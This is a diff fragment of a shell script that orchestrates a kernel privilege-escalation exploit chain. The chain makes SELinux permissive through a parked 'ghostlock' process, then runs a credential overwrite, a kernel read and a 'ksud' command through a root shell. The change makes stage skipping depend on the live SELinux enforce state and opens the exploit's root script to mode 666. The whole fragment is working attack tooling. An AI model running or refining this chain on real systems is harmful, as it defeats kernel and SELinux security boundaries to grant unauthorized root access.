@@ -34,13 +34,23 @@ grep -qa 'find_task_by_pid' "$DIR/cleanup-parked.sh" ||
     echo "cleanup-parked.sh: WARNING unknown version (no find_task_by_pid)"
 
 echo "== 1) W1 (uid $(id -u))"
-if grep -qa 'parking after W1' "$DIR/w1.log" 2>/dev/null; then
-    echo "w1.log already shows a parked W1 -- skipping (rm $DIR/w1.log to redo)"
+# Judge by the current *state*, not by a line in w1.log: the log survives a reboot
+# while SELinux comes back enforcing, so a stale "parking after W1" would skip the
+# only step that gets us permissive (and w1c.sh then refuses with exit 4).
+if [ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ] && pidof ghostlock >/dev/null 2>&1; then
+    echo "already permissive with a parked W1 (pid $(pidof ghostlock)) -- skipping"
 else
     sh "$DIR/w1.sh"
 fi
 grep -qa 'parking after W1' "$DIR/w1.log" 2>/dev/null ||
     { echo "WARNING: $DIR/w1.log has no 'parking after W1' line"; }
+[ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ] ||
+    echo "WARNING: W1 did not land (still enforcing) -- w1c.sh will refuse"
+# The exploit rewrites .ghostlock_root.sh as this uid on every start (umask leaves
+# 0755), and the W1c process runs as uid 0 *without* capabilities, so it can only
+# rewrite it if we open the mode here -- chmod needs ownership, and this side owns
+# the file.
+chmod 666 "$DIR/.ghostlock_root.sh" 2>/dev/null
 
 echo "== 2) self cred write + kread_min + ksud command, via rshell (uid 0)"
 sh "$RS" "sh $DIR/w1c.sh"
